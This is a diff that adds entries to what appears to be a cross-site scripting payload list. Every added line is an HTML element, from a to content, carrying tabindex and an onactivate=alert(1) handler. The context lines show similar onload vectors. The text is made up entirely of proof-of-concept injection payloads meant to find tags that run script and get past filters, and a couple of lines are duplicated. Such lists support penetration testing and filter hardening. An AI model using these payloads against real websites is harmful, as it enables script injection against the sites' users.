@@ -14,3 +14,38 @@
 <svg><image href=validimage.png onload=alert(1)>
 <isindex type=image onload=alert(1) src=validimage.png>
 <video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+
+
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<abbr id=x tabindex=1 onactivate=alert(1)></abbr>
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
+<address id=x tabindex=1 onactivate=alert(1)></address>
+<applet id=x tabindex=1 onactivate=alert(1)></applet>
+<area id=x tabindex=1 onactivate=alert(1)></area>
+<article id=x tabindex=1 onactivate=alert(1)></article>
+<aside id=x tabindex=1 onactivate=alert(1)></aside>
+<audio id=x tabindex=1 onactivate=alert(1)></audio>
+<b id=x tabindex=1 onactivate=alert(1)></b>
+<base id=x tabindex=1 onactivate=alert(1)></base>
+<basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
+<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<big id=x tabindex=1 onactivate=alert(1)></big>
+<blink id=x tabindex=1 onactivate=alert(1)></blink>
+<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>
+<body id=x tabindex=1 onactivate=alert(1)></body>
+<br id=x tabindex=1 onactivate=alert(1)></br>
+<button id=x tabindex=1 onactivate=alert(1)></button>
+<canvas id=x tabindex=1 onactivate=alert(1)></canvas>
+<caption id=x tabindex=1 onactivate=alert(1)></caption>
+<center id=x tabindex=1 onactivate=alert(1)></center>
+<cite id=x tabindex=1 onactivate=alert(1)></cite>
+<cite id=x tabindex=1 onactivate=alert(1)></cite>
+<col id=x tabindex=1 onactivate=alert(1)></col>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<command id=x tabindex=1 onactivate=alert(1)></command>
+<content id=x tabindex=1 onactivate=alert(1)></content>
+
+
